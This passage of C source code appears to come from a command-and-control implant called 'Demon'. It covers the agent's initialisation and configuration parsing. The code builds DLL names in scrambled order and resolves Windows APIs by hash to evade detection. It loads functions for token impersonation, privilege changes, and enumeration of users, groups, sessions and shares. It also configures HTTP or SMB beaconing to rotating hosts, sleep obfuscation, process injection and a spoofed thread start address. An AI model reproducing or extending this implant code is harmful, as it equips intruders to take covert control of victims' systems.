    Instance.Modules.Gdi32 = LdrModuleLoad( ModuleName );

    ModuleName[ 0 ] = 'w';
    ModuleName[ 4 ] = 'l';
    ModuleName[ 1 ] = 'k';
    ModuleName[ 6 ] = 0;
    ModuleName[ 2 ] = 's';
    ModuleName[ 3 ] = 'c';
    ModuleName[ 5 ] = 'i';
    Instance.Modules.Wkscli = LdrModuleLoad( ModuleName );

    ModuleName[ 0 ] = 'N';
    ModuleName[ 8 ] = 0;
    ModuleName[ 6 ] = '3';
    ModuleName[ 2 ] = 't';
    ModuleName[ 3 ] = 'A';
    ModuleName[ 4 ] = 'p';
    ModuleName[ 5 ] = 'i';
    ModuleName[ 1 ] = 'e';
    ModuleName[ 7 ] = '2';
    Instance.Modules.NetApi32 = LdrModuleLoad( ModuleName );

    ModuleName[ 0 ] = 'W';
    ModuleName[ 1 ] = 's';
    ModuleName[ 2 ] = '2';
    ModuleName[ 3 ] = '_';
    ModuleName[ 4 ] = '3';
    ModuleName[ 5 ] = '2';
    ModuleName[ 6 ] = 0;
    Instance.Modules.Ws2_32 = LdrModuleLoad( ModuleName );

    ModuleName[ 0 ] = 'D';
    ModuleName[ 1 ] = 'n';
    ModuleName[ 2 ] = 's';
    ModuleName[ 3 ] = 'a';
    ModuleName[ 4 ] = 'p';
    ModuleName[ 5 ] = 'i';
    ModuleName[ 6 ] = 0;
    Instance.Modules.Dnsapi = LdrModuleLoad( ModuleName );

    MemSet( ModuleName, 0, 20 );

    // TODO: sort function (library)

    if ( Instance.Modules.Advapi32 )
    {
        Instance.Win32.GetTokenInformation                 = LdrFunctionAddr( Instance.Modules.Advapi32, FuncHash_GetTokenInformation );
        Instance.Win32.CreateProcessWithTokenW             = LdrFunctionAddr( Instance.Modules.Advapi32, 0x94e76e4c );
        Instance.Win32.CreateProcessWithLogonW             = LdrFunctionAddr( Instance.Modules.Advapi32, 0x823c224a );
        Instance.Win32.RevertToSelf                        = LdrFunctionAddr( Instance.Modules.Advapi32, FuncHash_RevertToSelf );
        Instance.Win32.GetUserNameA                        = LdrFunctionAddr( Instance.Modules.Advapi32, FuncHash_GetUserNameA );
        Instance.Win32.LogonUserA                          = LdrFunctionAddr( Instance.Modules.Advapi32, 0x609d56e4 );
        Instance.Win32.LookupPrivilegeValueA               = LdrFunctionAddr( Instance.Modules.Advapi32, 0xbbae6e84 );
        Instance.Win32.LookupAccountSidA                   = LdrFunctionAddr( Instance.Modules.Advapi32, FuncHash_LookupAccountSidA );
        Instance.Win32.OpenThreadToken                     = LdrFunctionAddr( Instance.Modules.Advapi32, 579177116578842096 );
        Instance.Win32.OpenProcessToken                    = LdrFunctionAddr( Instance.Modules.Advapi32, 0xc57bd097 );
        Instance.Win32.ImpersonateLoggedOnUser             = LdrFunctionAddr( Instance.Modules.Advapi32, 0xa6ffd55a );
        Instance.Win32.AdjustTokenPrivileges               = LdrFunctionAddr( Instance.Modules.Advapi32, 0xce4cd9cb );
        Instance.Win32.LookupPrivilegeNameA                = LdrFunctionAddr( Instance.Modules.Advapi32, 0xe6176fe8 );
        Instance.Win32.SystemFunction032                   = LdrFunctionAddr( Instance.Modules.Advapi32, 0xcccf3585 );
        Instance.Win32.FreeSid                             = LdrFunctionAddr( Instance.Modules.Advapi32, 0x2174ce07 );
        Instance.Win32.SetSecurityDescriptorSacl           = LdrFunctionAddr( Instance.Modules.Advapi32, 0x4a8307ab );
        Instance.Win32.SetSecurityDescriptorDacl           = LdrFunctionAddr( Instance.Modules.Advapi32, 0x4a7acdfc );
        Instance.Win32.InitializeSecurityDescriptor        = LdrFunctionAddr( Instance.Modules.Advapi32, 0x70670cee );
        Instance.Win32.AddMandatoryAce                     = LdrFunctionAddr( Instance.Modules.Advapi32, 0x248cc186 );
        Instance.Win32.InitializeAcl                       = LdrFunctionAddr( Instance.Modules.Advapi32, 0x62cac4c7 );
        Instance.Win32.AllocateAndInitializeSid            = LdrFunctionAddr( Instance.Modules.Advapi32, 0x57a4ccf  );
        Instance.Win32.SetEntriesInAclW                    = LdrFunctionAddr( Instance.Modules.Advapi32, 0xe2d6b8e9 );

        PUTS( "Loaded Advapi32 functions" )
    }

    if ( Instance.Modules.Oleaut32 )
    {
        Instance.Win32.SafeArrayAccessData                 = LdrFunctionAddr( Instance.Modules.Oleaut32,  2675336209888825647 );
        Instance.Win32.SafeArrayUnaccessData               = LdrFunctionAddr( Instance.Modules.Oleaut32,  18329906161741280562 );
        Instance.Win32.SafeArrayCreate                     = LdrFunctionAddr( Instance.Modules.Oleaut32,  3571287155138900375 );
        Instance.Win32.SafeArrayPutElement                 = LdrFunctionAddr( Instance.Modules.Oleaut32,  2676058380407465830 );
        Instance.Win32.SafeArrayCreateVector               = LdrFunctionAddr( Instance.Modules.Oleaut32,  17426458116918762890 );
        Instance.Win32.SafeArrayDestroy                    = LdrFunctionAddr( Instance.Modules.Oleaut32,  7172011678126394509 );
        Instance.Win32.SysAllocString                      = LdrFunctionAddr( Instance.Modules.Oleaut32,  3847978704220612774 );

        PUTS( "Loaded Oleaut32 functions" )
    }

    if ( Instance.Modules.Shell32 )
    {
        Instance.Win32.CommandLineToArgvW                  = LdrFunctionAddr( Instance.Modules.Shell32, 0x8d607276 );

        PUTS( "Loaded Shell32 functions" )
    }

    if ( Instance.Modules.Msvcrt )
    {
        Instance.Win32.vsnprintf                           = LdrFunctionAddr( Instance.Modules.Msvcrt, 0xe61d840f );

        PUTS( "Loaded Msvcrt functions" )
    }

    if ( Instance.Modules.User32 )
    {
        Instance.Win32.ShowWindow                          = LdrFunctionAddr( Instance.Modules.User32, 8245429827274884638 );
        Instance.Win32.GetSystemMetrics                    = LdrFunctionAddr( Instance.Modules.User32, 0xa988c1a1 );
        Instance.Win32.GetDC                               = LdrFunctionAddr( Instance.Modules.User32, 0xd3d24ac );
        Instance.Win32.ReleaseDC                           = LdrFunctionAddr( Instance.Modules.User32, 0xe43871cd );

        PUTS( "Loaded User32 functions" )
    }

    if ( Instance.Modules.Gdi32 )
    {
        Instance.Win32.GetCurrentObject                    = LdrFunctionAddr( Instance.Modules.Gdi32, 0xd41e47df );
        Instance.Win32.GetObjectW                          = LdrFunctionAddr( Instance.Modules.Gdi32, 0x512b413 );
        Instance.Win32.CreateCompatibleDC                  = LdrFunctionAddr( Instance.Modules.Gdi32, 0xa05cbae0 );
        Instance.Win32.CreateDIBSection                    = LdrFunctionAddr( Instance.Modules.Gdi32, 0xfff5b73d );
        Instance.Win32.SelectObject                        = LdrFunctionAddr( Instance.Modules.Gdi32, 0x7cf4fd7c );
        Instance.Win32.BitBlt                              = LdrFunctionAddr( Instance.Modules.Gdi32, 0xa9804e46 );
        Instance.Win32.DeleteObject                        = LdrFunctionAddr( Instance.Modules.Gdi32, 0xcc68186f );
        Instance.Win32.DeleteDC                            = LdrFunctionAddr( Instance.Modules.Gdi32, 0x9f3bef5f );

        PUTS( "Loaded Gdi32 functions" )
    }

    if ( Instance.Modules.KernelBase )
    {
        Instance.Win32.SetProcessValidCallTargets          = LdrFunctionAddr( Instance.Modules.KernelBase, 0xbb6970d6 );

        PUTS( "Loaded KernelBase functions" )
    }

    // WinHttp
#ifdef TRANSPORT_HTTP
    if ( Instance.Modules.WinHttp )
    {
        Instance.Win32.WinHttpOpen                         = LdrFunctionAddr( Instance.Modules.WinHttp, 0x5e4f39e5 );
        Instance.Win32.WinHttpConnect                      = LdrFunctionAddr( Instance.Modules.WinHttp, 0x7242c17d );
        Instance.Win32.WinHttpOpenRequest                  = LdrFunctionAddr( Instance.Modules.WinHttp, 0xeab7b9ce );
        Instance.Win32.WinHttpSetOption                    = LdrFunctionAddr( Instance.Modules.WinHttp, 0xa18b94f8 );
        Instance.Win32.WinHttpCloseHandle                  = LdrFunctionAddr( Instance.Modules.WinHttp, 0x36220cd5 );
        Instance.Win32.WinHttpSendRequest                  = LdrFunctionAddr( Instance.Modules.WinHttp, 0xb183faa6 );
        Instance.Win32.WinHttpAddRequestHeaders            = LdrFunctionAddr( Instance.Modules.WinHttp, 0xed7fcb41 );
        Instance.Win32.WinHttpReceiveResponse              = LdrFunctionAddr( Instance.Modules.WinHttp, 0x146c4925 );
        Instance.Win32.WinHttpWebSocketCompleteUpgrade     = LdrFunctionAddr( Instance.Modules.WinHttp, 0x58929db  );
        Instance.Win32.WinHttpQueryDataAvailable           = LdrFunctionAddr( Instance.Modules.WinHttp, 0x34cb8684 );
        Instance.Win32.WinHttpReadData                     = LdrFunctionAddr( Instance.Modules.WinHttp, 0x7195e4e9 );
        Instance.Win32.WinHttpQueryHeaders                 = LdrFunctionAddr( Instance.Modules.WinHttp, 0x389cefa5 );

        PUTS( "Loaded WinHttp functions" )
    }
#endif

    if ( Instance.Modules.Mscoree )
    {
        Instance.Win32.CLRCreateInstance = LdrFunctionAddr( Instance.Modules.Mscoree,  10918823944048432655 );
    }

    if ( Instance.Modules.Iphlpapi )
    {
        Instance.Win32.GetAdaptersInfo = LdrFunctionAddr( Instance.Modules.Iphlpapi, 0xbc950fc5 );
    }

    if ( Instance.Modules.NetApi32 )
    {
        Instance.Win32.NetLocalGroupEnum = LdrFunctionAddr( Instance.Modules.NetApi32, 0x2c3fa6b9 );
        Instance.Win32.NetGroupEnum      = LdrFunctionAddr( Instance.Modules.NetApi32, 0xb278fc6e );
        Instance.Win32.NetUserEnum       = LdrFunctionAddr( Instance.Modules.NetApi32, 0xe84c1c20 );
        Instance.Win32.NetWkstaUserEnum  = LdrFunctionAddr( Instance.Modules.NetApi32, 0x3f45a8a  );
        Instance.Win32.NetSessionEnum    = LdrFunctionAddr( Instance.Modules.NetApi32, 0x80edcd45 );
        Instance.Win32.NetShareEnum      = LdrFunctionAddr( Instance.Modules.NetApi32, 0xb0461db4 );
        Instance.Win32.NetApiBufferFree  = LdrFunctionAddr( Instance.Modules.NetApi32, 0x83e6be2  );

        PUTS( "Loaded NetApi32 functions" )
    }

    if ( Instance.Modules.Ws2_32 )
    {
        Instance.Win32.WSAStartup   = LdrFunctionAddr( Instance.Modules.Ws2_32, 0x6128c683 );
        Instance.Win32.WSACleanup   = LdrFunctionAddr( Instance.Modules.Ws2_32, 0x7f1aab78 );
        Instance.Win32.WSASocketA   = LdrFunctionAddr( Instance.Modules.Ws2_32, 0x559f159a );
        Instance.Win32.ioctlsocket  = LdrFunctionAddr( Instance.Modules.Ws2_32, 0x6dcd609  );
        Instance.Win32.bind         = LdrFunctionAddr( Instance.Modules.Ws2_32, 0x7c9499e2 );
        Instance.Win32.listen       = LdrFunctionAddr( Instance.Modules.Ws2_32, 0xb794014  );
        Instance.Win32.accept       = LdrFunctionAddr( Instance.Modules.Ws2_32, 0xf15ae9b5 );
        Instance.Win32.closesocket  = LdrFunctionAddr( Instance.Modules.Ws2_32, 0x494cb104 );
        Instance.Win32.recv         = LdrFunctionAddr( Instance.Modules.Ws2_32, 0x7c9d4d95 );
        Instance.Win32.send         = LdrFunctionAddr( Instance.Modules.Ws2_32, 0x7c9ddb4f );
        Instance.Win32.connect      = LdrFunctionAddr( Instance.Modules.Ws2_32, 0xd3764dcf );

        PUTS( "Loaded Ws2_32 functions" )
    }

    if ( Instance.Modules.Dnsapi )
    {
        Instance.Win32.DnsQuery_A = LdrFunctionAddr( Instance.Modules.Dnsapi, 0xeb04a380 );

        PUTS( "Loaded DnsApi functions" )
    }

    PUTS( "Set basic info" )

    if ( ! NT_SUCCESS( Instance.Syscall.NtQuerySystemInformation( SystemProcessorInformation, &SystemInfo, sizeof( SYSTEM_PROCESSOR_INFORMATION ), 0 ) ) )
    PUTS( "[!] NtQuerySystemInformation Failed" );

    if ( ! Instance.Session.ModuleBase )
        /* if we specified nothing as our ModuleBase then this either means that we are an exe or we should use the whole process */
        Instance.Session.ModuleBase = LdrModulePeb( NULL );

    Instance.Session.OS_Arch     = SystemInfo.ProcessorArchitecture;
    Instance.Session.PID         = Instance.Teb->ClientId.UniqueProcess;
    Instance.Session.ProcessArch = PROCESS_AGENT_ARCH;
    Instance.Session.Connected   = FALSE;
    Instance.Session.AgentID     = RandomNumber32(); // generate a random ID
    Instance.Config.AES.Key      = NULL;
    Instance.Config.AES.IV       = NULL;

    /* Linked lists */
    Instance.Tokens.Vault        = NULL;
    Instance.Tokens.Impersonate  = FALSE;
    Instance.Jobs                = NULL;
    Instance.Downloads           = NULL;
    Instance.Sockets             = NULL;

    /* Global Objects */
    Instance.Dotnet = NULL;

    PRINTF( "Instance DemonID => %x\n", Instance.Session.AgentID )
}

VOID DemonConfig()
{
    PARSER Parser = { 0 };
    PVOID  Buffer = NULL;
    ULONG  Temp   = 0;
    DWORD  Length = 0;
    DWORD  J      = 0;

    PRINTF( "Config Size: %d\n", sizeof( AgentConfig ) )

    ParserNew( &Parser, AgentConfig, sizeof( AgentConfig ) );
    RtlSecureZeroMemory( AgentConfig, sizeof( AgentConfig ) );

    Instance.Config.Sleeping       = ParserGetInt32( &Parser );

    Instance.Config.Memory.Alloc   = ParserGetInt32( &Parser );
    Instance.Config.Memory.Execute = ParserGetInt32( &Parser );

    PRINTF(
            "[CONFIG] Memory: \n"
            " - Allocate: %d  \n"
            " - Execute : %d  \n",
            Instance.Config.Memory.Alloc,
            Instance.Config.Memory.Execute
    )

    Buffer = ParserGetBytes( &Parser, &Length );
    Instance.Config.Process.Spawn64 = Instance.Win32.LocalAlloc( LPTR, Length );
    MemCopy( Instance.Config.Process.Spawn64, Buffer, Length );
    Instance.Config.Process.Spawn64[ Length ] = 0;

    Buffer = ParserGetBytes( &Parser, &Length );
    Instance.Config.Process.Spawn86 = Instance.Win32.LocalAlloc( LPTR, Length );
    MemCopy( Instance.Config.Process.Spawn86, Buffer, Length );
    Instance.Config.Process.Spawn86[ Length ] = 0;

    PRINTF(
            "[CONFIG] Spawn: \n"
            " - [x64] => %s  \n"
            " - [x86] => %s  \n",
            Instance.Config.Process.Spawn64,
            Instance.Config.Process.Spawn86
    )

    Instance.Config.Implant.SleepMaskTechnique = ParserGetInt32( &Parser );
    Instance.Config.Implant.DownloadChunkSize  = 512000; /* 512k by default. */

    PRINTF(
        "[CONFIG] Sleep Obfuscation: \n"
        " - Technique: %d \n",
        Instance.Config.Implant.SleepMaskTechnique
    )

#ifdef TRANSPORT_HTTP
    Instance.Config.Transport.Method         = L"POST"; /* TODO: make it optional */
    Instance.Config.Transport.HostRotation   = ParserGetInt32( &Parser );
    Instance.Config.Transport.HostMaxRetries = 0;  /* Max retries. 0 == infinite retrying
                                                    * TODO: add this to the yaotl language and listener GUI */
    Instance.Config.Transport.Hosts          = NULL;
    Instance.Config.Transport.Host           = NULL;

    /* J contains our Hosts counter */
    J = ParserGetInt32( &Parser );
    PRINTF( "[CONFIG] Hosts [%d]:", J )
    for ( INT i = 0; i < J; i++ )
    {
        Buffer = ParserGetBytes( &Parser, &Length );
        Temp   = ParserGetInt32( &Parser );

        PRINTF( " - %ls:%ld\n", Buffer, Temp )

        /* if our host address is longer than 0 then lets use it. */
        if ( Length > 0 )
            /* Add parse host data to our linked list */
            HostAdd( Buffer, Length, Temp );
    }
    PRINTF( "Hosts added => %d\n", HostCount() )

    /* Get Host data based on our host rotation strategy */
    Instance.Config.Transport.Host = HostRotation( Instance.Config.Transport.HostRotation );
    PRINTF( "Host going to be used is => %ls:%ld\n", Instance.Config.Transport.Host->Host, Instance.Config.Transport.Host->Port )

    // Listener Secure (SSL)
    Instance.Config.Transport.Secure = ParserGetInt32( &Parser );
    PRINTF( "[CONFIG] Secure: %s\n", Instance.Config.Transport.Secure ? "TRUE" : "FALSE" );

    // UserAgent
    Buffer = ParserGetBytes( &Parser, &Length );
    Instance.Config.Transport.UserAgent = NtHeapAlloc( Length + sizeof( WCHAR ) );
    MemCopy( Instance.Config.Transport.UserAgent, Buffer, Length );
    PRINTF( "[CONFIG] UserAgent: %ls\n", Instance.Config.Transport.UserAgent );

    // Headers
    J = ParserGetInt32( &Parser );
    Instance.Config.Transport.Headers = NtHeapAlloc( sizeof( LPWSTR ) * ( ( J + 1 ) * 2 ) );
    PRINTF( "[CONFIG] Headers [%d]:\n", J );
    for ( INT i = 0; i < J; i++ )
    {
        Buffer = ParserGetBytes( &Parser, &Length );
        Instance.Config.Transport.Headers[ i ] = NtHeapAlloc( Length + sizeof( WCHAR ) );
        MemSet( Instance.Config.Transport.Headers[ i ], 0, Length );
        MemCopy( Instance.Config.Transport.Headers[ i ], Buffer, Length );
#ifdef DEBUG
        printf( "  - %ls\n", Instance.Config.Transport.Headers[ i ] );
#endif
    }
    Instance.Config.Transport.Headers[ J + 1 ] = NULL;

    // Uris
    J = ParserGetInt32( &Parser );
    Instance.Config.Transport.Uris = NtHeapAlloc( sizeof( LPWSTR ) * ( ( J + 1 ) * 2 ) );
    PRINTF( "[CONFIG] Uris [%d]:\n", J );
    for ( INT i = 0; i < J; i++ )
    {
        Buffer = ParserGetBytes( &Parser, &Length );
        Instance.Config.Transport.Uris[ i ] = NtHeapAlloc( Length + sizeof( WCHAR ) );
        MemSet( Instance.Config.Transport.Uris[ i ], 0, Length + sizeof( WCHAR ) );
        MemCopy( Instance.Config.Transport.Uris[ i ], Buffer, Length );
#ifdef DEBUG
        printf( "  - %ls\n", Instance.Config.Transport.Uris[ i ] );
#endif
    }
    Instance.Config.Transport.Uris[ J + 1 ] = NULL;

    // check if proxy connection is enabled
    Instance.Config.Transport.Proxy.Enabled = ( BOOL ) ParserGetInt32( &Parser );;
    if ( Instance.Config.Transport.Proxy.Enabled )
    {
        PUTS( "[CONFIG] [PROXY] Enabled" );
        Buffer = ParserGetBytes( &Parser, &Length );
        Instance.Config.Transport.Proxy.Url = NtHeapAlloc( Length + sizeof( WCHAR ) );
        MemCopy( Instance.Config.Transport.Proxy.Url, Buffer, Length );
        PRINTF( "[CONFIG] [PROXY] Url: %ls\n", Instance.Config.Transport.Proxy.Url );

        Buffer = ParserGetBytes( &Parser, &Length );
        if ( Length > 0 )
        {
            Instance.Config.Transport.Proxy.Username = NtHeapAlloc( Length );
            MemCopy( Instance.Config.Transport.Proxy.Username, Buffer, Length );
            PRINTF( "[CONFIG] [PROXY] Username: %ls\n", Instance.Config.Transport.Proxy.Username );
        }
        else
            Instance.Config.Transport.Proxy.Username = NULL;

        Buffer = ParserGetBytes( &Parser, &Length );
        if ( Length > 0 )
        {
            Instance.Config.Transport.Proxy.Password = NtHeapAlloc( Length );
            MemCopy( Instance.Config.Transport.Proxy.Password, Buffer, Length );
            PRINTF( "[CONFIG] [PROXY] Password: %ls\n", Instance.Config.Transport.Proxy.Password );
        }
        else
            Instance.Config.Transport.Proxy.Password = NULL;
    }
    else
    {
        PUTS( "[CONFIG] [PROXY] Disabled" );
    }
#endif

#ifdef TRANSPORT_SMB

    Buffer = ParserGetBytes( &Parser, &Length );
    Instance.Config.Transport.Name = Instance.Win32.LocalAlloc( LPTR, Length * 2 );
    CharStringToWCharString( Instance.Config.Transport.Name, Buffer, Length );

    PRINTF( "[CONFIG] PipeName: %ls\n", Instance.Config.Transport.Name );

#endif

    Instance.Config.Implant.ThreadStartAddr = Instance.Win32.LdrLoadDll + 0x12; /* TODO: default -> change that or make it optional via builder or profile */
    Instance.Config.Inject.Technique        = INJECTION_TECHNIQUE_SYSCALL;

    ParserDestroy( &Parser );
}